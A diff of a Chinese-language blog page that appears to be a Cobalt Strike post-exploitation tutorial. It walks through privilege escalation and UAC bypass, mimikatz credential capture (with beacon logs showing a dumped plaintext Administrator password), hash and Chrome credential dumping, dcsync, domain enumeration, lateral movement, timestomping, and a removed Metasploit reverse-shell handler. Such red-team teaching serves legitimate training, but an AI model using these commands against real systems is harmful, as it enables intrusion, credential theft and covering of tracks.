+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png"
+        title="image-20240228123924934" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png"
+        title="image-20240228123943465" /></p>
+<p>找到目前正在使用IE浏览器的目标后，右击该会话，选择<code>Explore --&gt; Browser Pivot</code>，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。</p>
+<p>此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。</p>
+<p>代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。</p>
+<h3 id="elevate-with-an-exploit">Elevate with an Exploit</h3>
+<p><strong>elevate</strong>：列出CS已经注册的权限提升的可用列表</p>
+<p><strong>elevate [exploit] [listener]</strong>：使用具体的exploit执行权限提升，beacon给到指定的listener</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png"
+        title="image-20240228161720292" /></p>
+<p>这里给出的可用exp有很多，默认的只有两个，其他的使用了第三方脚本：https://github.com/rsmudge/ElevateKit</p>
+<p>此处我们的目标是高版本的windows 10系统，所以上述方法基本全军覆没，我只测试了一个<code>uac-schtasks</code>成功提权到admin：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png"
+        title="image-20240228164701226" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png"
+        title="image-20240228164719594" /></p>
+<p>在尝试了所有方法都不行的时候就需要自行上传提权工具或者exp，进行权限提升。</p>
+<p><strong>runasadmin</strong>：使用管理员权限执行单条命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png"
+        title="image-20240228165055680" /></p>
+<h3 id="elevate-with-known-credentials">Elevate with Known Credentials</h3>
+<p>如果提前获取了一些账号密码，则可以使用已知的高权限账号密码来提权。</p>
+<p><strong>runas [DOMAIN\user] [password] [command]</strong>- This runs a command as another user using their credentials. The runas command will not return any output. You may use runas from a non- privileged context though.</p>
+<p><strong>spawnas [DOMAIN\user] [password] [listener]</strong> - This command spawns a session as another user using their credentials. This command spawns a temporary process and injects your payload stage into it.</p>
+<p>使用这两个命令时，请注意非 SID 500 帐户的凭据将在中等完整性上下文中生成有效负载。 需要使用绕过 UAC 来提升到高完整性上下文。 此外，应该从指定帐户可以读取的工作文件夹运行这些命令。</p>
+<h3 id="get-system">Get SYSTEM</h3>
+<p>伪造一个SYSTEM账户的token。</p>
+<p><strong>getsystem</strong> - This command impersonates a token for the SYSTEM account. This level of access may allow you to perform privileged actions that are not possible as an Administrator user.</p>
+<p>Another way to get SYSTEM is to create a service that runs a payload. The <strong>elevate svc-exe [listener]</strong> command does this. It will drop an executable that runs a payload, create a service to run it, assume control of the payload, and cleanup the service and executable.</p>
+<h3 id="uac-bypass">UAC Bypass</h3>
+<p>如果当前的用户不是<code>Administrator</code>的话，这种方式可能不成功，所以先用<code>run whoami /groups</code>看一下当前用户是否在<code>Administrators</code>组里面。</p>
+<p>常用的有以下几种：</p>
+<p><strong>elevate uac-token-duplication [listener]</strong> - This command spawns a temporary process with elevated rights and inject a payload stage into it. This attack uses a UAC-loophole that allows a non-elevated process to launch an arbitrary process with a token stolen from an elevated process. This loophole requires the attack to remove several rights assigned to the elevated token. The abilities of your new session will reflect these restricted rights. If Always Notify is at its highest setting, this attack requires that an elevated process is already running in the current desktop session (as the same user). This attack works on Windows 7 and Windows 10 prior to the November 2018 update.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png"
+        title="image-20240228171453255" /></p>
+<p><strong>runasadmin uac-token-duplication [command]</strong> - This is the same attack described above, but this variant runs a command of your choosing in an elevated context.</p>
+<p><strong>runasadmin uac-cmstplua [command]</strong> - This command attempta to bypass UAC and run a command in an elevated context. This attack relies on a COM object that automatically elevates from certain process contexts (Microsoft signed, lives in c:\windows*).</p>
+<h3 id="mimikatz">Mimikatz</h3>
+<p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p>
+<ul>
+<li><code>mimikatz [module::command] &lt;args&gt;</code> 运行 mimikatz 命令</li>
+<li><code>mimikatz [!module::command] &lt;args&gt;</code> 强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。</li>
+<li><code>mimikatz [@module::command] &lt;args&gt;</code> 使用当前 Beacon 的访问令牌运行 mimikatz 命令</li>
+</ul>
+<p>下面是一些<code>mimikatz</code>命令。</p>
+<ul>
+<li><code>!lsadump::cache</code> 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</li>
+<li><code>!lsadump::sam</code> 获取本地账户密码哈希，该命令与 hashdump 比较类似</li>
+<li><code>misc::cmd</code> 如果注册表中禁用了 CMD ，就重新启用它</li>
+<li><code>!misc::memssp</code> 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</li>
+<li><code>misc::skeleton</code> 该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</li>
+<li><code>process::suspend [pid]</code> 挂起某个进程，但是不结束它</li>
+<li><code>process::resume [pid]</code> 恢复挂起的进程</li>
+</ul>
+<p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz !misc::memssp
+</span></span><span class="line"><span class="cl">cd C:\Windows\system32
+</span></span><span class="line"><span class="cl">shell dir mimilsa.log
+</span></span><span class="line"><span class="cl">shell type mimilsa.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>详细运行过程：</p>
+<p>首先运行<code>mimikatz !misc::memssp</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">beacon&gt; mimikatz !misc::memssp
+</span></span><span class="line"><span class="cl">[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command
+</span></span><span class="line"><span class="cl">[+] host called home, sent: 1006151 bytes
+</span></span><span class="line"><span class="cl">[+] received output:
+</span></span><span class="line"><span class="cl">Injected =)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来来到<code>C:\Windows\system32</code>目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">beacon&gt; cd C:\Windows\system32
+</span></span><span class="line"><span class="cl">[*] cd C:\Windows\system32
+</span></span><span class="line"><span class="cl">[+] host called home, sent: 27 bytes
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">beacon&gt; shell dir mimilsa.log
+</span></span><span class="line"><span class="cl">[*] Tasked beacon to run: dir mimilsa.log
+</span></span><span class="line"><span class="cl">[+] host called home, sent: 46 bytes
+</span></span><span class="line"><span class="cl">[+] received output:
+</span></span><span class="line"><span class="cl"> 驱动器 C 中的卷没有标签。
+</span></span><span class="line"><span class="cl"> 卷的序列号是 BE29-9C84
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> C:\Windows\system32 的目录
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">2020/07/23  21:47                24 mimilsa.log
+</span></span><span class="line"><span class="cl">               1 个文件             24 字节
+</span></span><span class="line"><span class="cl">               0 个目录 17,394,728,960 可用字节
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p>
+<p>查看<code>mimilsa.log</code>文件内容。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -740,39 +981,181 @@
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf &gt; use exploit/multi/handler
-</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_https
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_https
-</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.211.55.2
-</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; msf ip
-</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
-</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">4444</span>
-</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">beacon&gt; shell type mimilsa.log
+</span></span><span class="line"><span class="cl">[*] Tasked beacon to run: type mimilsa.log
+</span></span><span class="line"><span class="cl">[+] host called home, sent: 47 bytes
+</span></span><span class="line"><span class="cl">[+] received output:
+</span></span><span class="line"><span class="cl">[00000000:000003e5] \    
+</span></span><span class="line"><span class="cl">[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>然后在cs里配置，填上msf的ip和监听端口。</p>
-<p>然后选择会话右键派生，会话选择forign beacon：</p>
+</div><p>成功获取到当前登录用户的明文密码。</p>
+<h3 id="credential-and-hash-harvesting">Credential and Hash Harvesting</h3>
+<p>需要在管理员权限的session下执行。</p>
+<p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png"
-        title="image-20240227195131535" /></p>
-<p>随后在msf中就会接收到会话：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png"
+        title="image-20240228173042362" /></p>
+<p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png"
-        title="image-20240227195228315" /></p></div><div class="post-footer" id="post-footer">
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png"
+        title="image-20240228173025010" /></p>
+<p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png"
+        title="image-20240228173105853" /></p>
+<p>To dump hashes, go to <strong>[beacon]</strong> -&gt; <strong>Access</strong> -&gt; <strong>Dump Hashes</strong>. You can also use the <strong>hashdump [pid] [x86|x64]</strong> command from the Beacon console to inject the hashdump tool into the specified process. Use <strong>hashdump</strong> (without [pid] and [arch] arguments) to spawn a temporary process and inject the hashdump tool into it. These commands will spawn a job that injects into LSASS and dumps the password hashes for local users on the current system. This command requires administrator privileges. If injecting into a pid that process requires administrator privileges.</p>
+<p>Use <strong>logonpasswords [pid] [arch]</strong> to inject into the specified process to dump plaintext credentials and NTLM hashes. Use <strong>logonpasswords</strong> (without [pid] and [arch] arguments) to spawn a temporary process to dump plaintext credentials and NTLM hashes. This command uses mimikatz and requires administrator privileges.</p>
+<p>Use <strong>dcsync [pid] [arch] [DOMAIN.fqdn] &lt;DOMAIN\user&gt;</strong> to inject into the specified process to extract the NTLM password hashes. Use <strong>dcsync [DOMAIN.fqdn] &lt;DOMAIN\user&gt;</strong> to spawn a temporary process to extract the NTLM password hashes. This command uses mimikatz to extract the NTLM password hash for domain users from the domain controller. Specify a user to get their hash only. This command requires a domain administrator trust relationship.</p>
+<p>Use <strong>chromedump [pid] [arch]</strong> to inject into the specified process to recover credential material from Google Chrome. Use <strong>chromedump</strong> (without [pid] and [arch] arguments) to spawn a temporary process to recover credential material from Google Chrome. This command will use Mimikatz to recover the credential material and should be run under a user context.</p>
+<p>Credentials dumped with the above commands are collected by Cobalt Strike and stored in the credentials data model. Go to <strong>View</strong> -&gt; <strong>Credentials</strong> to pull up the credentials on the current team server.</p>
+<h3 id="port-scanning">Port Scanning</h3>
+<ul>
+<li><code>portscan</code>：进行端口扫描，使用参数为：<code>portscan [targets] [ports] [discovery method]</code>。 目标发现<code>discovery method</code>有三种方法，分别是：<code>arp、icmp、none</code>，<code>arp</code>方法使用 ARP 请求来发现一个主机是否存活。<code>icmp</code>方法发送一个 ICMP echo 请求来检查一个目标是否存活。<code>none</code>选项让端口扫描工具假设所有的主机都是存活的。</li>
+</ul>
+<p>端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png"
+        title="image-20240228124315102" /></p>
+<p>右击 Beacon会话，在<code>Explore --&gt; Port Scan</code>中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png"
+        title="image-20240228124532050" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png"
+        title="image-20240228124556748" /></p>
+<h3 id="network-and-host-enumeration">Network and Host Enumeration</h3>
+<p>Beacon的net模块提供了在Windows域环境下目标发现的工具。</p>
+<p>Use <strong>net [pid] [arch] [command] [arguments]</strong> to inject the network and host enumeration tool into the specified process. Use <strong>net [command] [arguments]</strong> (without [pid] and [arch] arguments) to spawn a temporary process and inject the network and host enumeration tool into it. An exception is the <strong>net domain</strong> command which is implemented as a BOF.net domain.</p>
+<p>The commands in Beacon’s net module are built on top of the Windows Network Enumeration APIs. Most of these commands are direct replacements for many of the built- in net commands in Windows (there are also a few unique capabilities here as well). The following commands are available:</p>
+<p><strong>computers</strong> - lists hosts in a domain (groups)
+<strong>dclist</strong> - lists domain controllers. (populates the targets model) <strong>domain</strong> - display domain for this host
+<strong>domain_controllers</strong> - lists DCs in a domain (groups)</p>
+<p><strong>domain_trusts</strong> - lists domain trusts</p>
+<p><strong>group</strong> - lists groups and users in groups</p>
+<p><strong>localgroup</strong> - lists local groups and users in local groups. (great during lateral movement when you have to find who is a local admin on another system).</p>
+<p><strong>logons</strong> - lists users logged onto a host <strong>sessions</strong> - lists sessions on a host <strong>share</strong> - lists shares on a host
+<strong>user</strong> - lists users and user information <strong>time</strong> - show time for a host</p>
+<p><strong>view</strong> - lists hosts in a domain (browser service). (populates the targets model)</p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>Once you have a token for a domain admin or a domain user who is a local admin on a target, you may abuse this trust relationship to get control of the target. Cobalt Strike’s Beacon has several built-in options for lateral movement.</p>
+<p>Type <strong>jump</strong> to list lateral movement options registered with Cobalt Strike. Run <strong>jump</strong> <strong>[module] [target] [listener]</strong> to attempt to run a payload on a remote target.</p>
+<p><strong>Post Exploitation /</strong> <strong>Lateral Movement</strong></p>
+<table>
+<thead>
+<tr>
+<th>Jump Module</th>
+<th>Arch</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>psexec</td>
+<td>x86</td>
+<td>Use a service to run a Service EXE artifact</td>
+</tr>
+<tr>
+<td>psexec64</td>
+<td>x64</td>
+<td>Use a service to run a Service EXE artifact</td>
+</tr>
+<tr>
+<td>psexec_psh</td>
+<td>x86</td>
+<td>Use a service to run a PowerShell one-liner</td>
+</tr>
+<tr>
+<td>winrm</td>
+<td>x86</td>
+<td>Run a PowerShell script via WinRM</td>
+</tr>
+<tr>
+<td>winrm64</td>
+<td>x64</td>
+<td>Run a PowerShell script via WinRM</td>
+</tr>
+</tbody>
+</table>
+<p>Run <strong>remote-exec</strong>, by itself, to list remote execution modules registered with Cobalt Strike. Use <strong>remote-exec [module] [target] [command + args]</strong> to attempt to run the specified command on a remote target.</p>
+<p><strong>Post Exploitation /</strong> <strong>Lateral Movement GUI</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Remote-exec Module Description</strong></th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>psexec</td>
+<td>Remote execute via Service Control Manager</td>
+</tr>
+<tr>
+<td>winrm</td>
+<td>Remote execute via WinRM (PowerShell)</td>
+</tr>
+<tr>
+<td>wmi</td>
+<td>Remote execute via WMI</td>
+</tr>
+</tbody>
+</table>
+<p>Lateral movement is an area, similar to privilege escalation, where some attacks present a natural set of primitives to spawn a session on a remote target. Some attacks give an execute-primitive only. The split between jump and remote-exec gives you flexibility to decide how to weaponize an execute-only primitive.</p>
+<p>Aggressor Script has an API to add new modules to jump and remote-exec. See the Aggressor Script documentation (the Beacon chapter, specifically) for more information.</p>
+<p>Cobalt Strike also provides a GUI to make lateral movement easier. Switch to the Targets Visualization or go to <strong>View</strong> -&gt; <strong>Targets</strong>. Navigate to <strong>[target]</strong> -&gt; <strong>Jump</strong> and choose your desired lateral movement option.</p>
+<p>The following dialog will open:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png"
+        title="image-20240228175116204" /></p>
+<p>First, decide which trust you want to use for lateral movement. If you want to use the token in one of your Beacons, check the <em>Use session’s current access token</em> box. If you want to use credentials or hashes for lateral movement—that’s OK too. Select credentials from the credential store or populate the User, Password, and Domain fields. Beacon will use this information to generate an access token for you. Keep in mind, you need to operate from a high integrity context [administrator] for this to work.</p>
+<p>Next, choose the listener to use for lateral movement. The SMB Beacon is usually a good candidate here.</p>
+<p>Last, select which session you want to perform the lateral movement attack from. Cobalt Strike’s asynchronous model of offense requires each attack to execute from a compromised system.</p>
+<p>There is no option to perform this attack without a Beacon session to attack from. If you’re on an internal engagement, consider hooking a Windows system that you control and use that as your starting point to attack other systems with credentials or hashes.</p>
+<p>Press <strong>Launch</strong>. Cobalt Strike will activate the tab for the selected Beacon and issue commands to it. Feedback from the attack will show up in the Beacon console.</p>
+<p>Other Commands</p>
+<p>Beacon has a few other commands not covered above.</p>
+<p>The <strong>clear</strong> command will clear Beacon&rsquo;s task list. Use this if you make a mistake.</p>
+<p>Type <strong>exit</strong> to ask Beacon to exit.</p>
+<p>Use <strong>kill [pid]</strong> to terminate a process.</p>
+<p>Use <strong>timestomp</strong> to match the Modified, Accessed, and Created times of one file to those of another file.</p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -796,7 +1179,7 @@
     </div>
 
     <div class="post-nav"><a href="/2023/11/index-zh.cn/" class="prev" rel="prev" title="Vulnhub Matrix-breakout-2-Morpheus"><i class="fas fa-angle-left fa-fw"></i>Vulnhub Matrix-breakout-2-Morpheus</a>
-            <a href="/2024/02/index-zh.cn/" class="next" rel="next" title="CS隐藏随笔">CS隐藏随笔<i class="fas fa-angle-right fa-fw"></i></a></div>
+            <a href="/2024/01/index-zh.cn/" class="next" rel="next" title="Cobalt Strike基础教程（一）">Cobalt Strike基础教程（一）<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
